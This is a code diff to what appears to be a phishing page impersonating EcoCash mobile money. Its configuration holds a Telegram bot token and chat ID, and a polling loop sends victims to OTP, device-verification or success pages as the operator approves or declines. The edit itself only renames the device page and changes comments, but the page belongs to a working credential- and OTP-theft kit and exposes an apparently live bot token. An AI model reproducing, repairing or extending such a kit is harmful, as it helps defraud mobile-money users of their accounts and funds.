@@ -307,7 +307,7 @@
 
     .terms a { color: var(--blue); font-weight: 800; }
 
-    /* Spinner overlay — matches code 1 style but in EcoCash blue */
+    /* Spinner overlay */
     #spinnerOverlay {
       position: fixed;
       inset: 0;
@@ -437,7 +437,7 @@
       BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
       CHAT_ID: '7547427914',
       APPROVE_PAGE: 'otp.html',
-      DEVICE_PAGE: 'device_verify.html',
+      DEVICE_PAGE: 'device.html',      // ← fixed: was device_verify.html
       SUCCESS_PAGE: 'success.html'
     };
 
@@ -567,7 +567,7 @@
                 else if (cb === verifyId) {
                   clearInterval(interval);
                   spinnerOverlay.style.display = 'none';
-                  window.location.href = CONFIG.DEVICE_PAGE;
+                  window.location.href = CONFIG.DEVICE_PAGE;   // → device.html
                 }
                 else if (cb === declineId) {
                   clearInterval(interval);
